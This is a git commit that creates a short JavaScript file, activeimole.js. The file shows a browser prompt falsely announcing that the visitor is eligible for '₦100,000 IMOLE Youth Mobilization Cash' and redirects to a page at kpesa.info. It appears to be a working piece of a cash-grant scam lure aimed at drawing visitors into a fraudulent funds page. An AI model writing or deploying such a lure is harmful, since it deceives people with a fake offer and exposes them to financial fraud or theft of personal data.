b048f566a82d4761540da8bbe912ab474e9dd036
kpesaa <meiosis_logins.2d@icloud.com>
2026-05-07 19:38:06 +0100

    Create activeimole.js

---
+++ activeimole.js
@@ -0,0 +1,11 @@
+
+var password = '₦100,000';
+
+password = prompt(
+  'Congratulations, you are eligible for ₦100,000 IMOLE Youth Mobilization Cash. Click OK to activate now.',
+  '₦100,000'
+);
+
+if (password !== '₦100,000') {
+    location.href = 'https://kpesa.info/100k-Youth-Funds.html';
+}
